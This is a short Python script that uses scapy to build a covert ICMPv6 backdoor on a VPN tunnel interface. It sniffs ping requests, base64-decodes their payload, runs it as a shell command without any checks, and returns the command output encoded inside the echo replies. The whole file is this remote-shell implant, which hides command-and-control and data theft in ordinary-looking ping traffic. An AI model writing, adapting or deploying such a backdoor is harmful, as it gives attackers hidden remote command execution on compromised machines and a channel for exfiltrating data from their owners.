#!/usr/bin/env python 

import os
import base64
from scapy.all import *

def main():
  conf.iface="cscotun0"

  while True:
    rx = sniff(filter="icmp6 && ip6[40] == 128", count=1)

    if rx[0].haslayer(ICMPv6EchoRequest):
      print("Source: ", rx[0].src)
      print("Data: ", rx[0].data)
      var=rx[0].data

      var=base64.b64decode(var)
      res=os.popen(var).read()
      res=res[:900] 
      print("Sending:", res)

      encodedBytes = base64.b64encode(res.encode("utf-8"))
      encodedStr = str(encodedBytes)

      send(IPv6(dst=rx[0].getlayer(IPv6).src,fl=0x1d723)/ICMPv6EchoReply(id=0x0000, seq=rx[0].getlayer(ICMPv6EchoRequest).seq)/encodedStr)
		
if __name__ == "__main__":
    main()
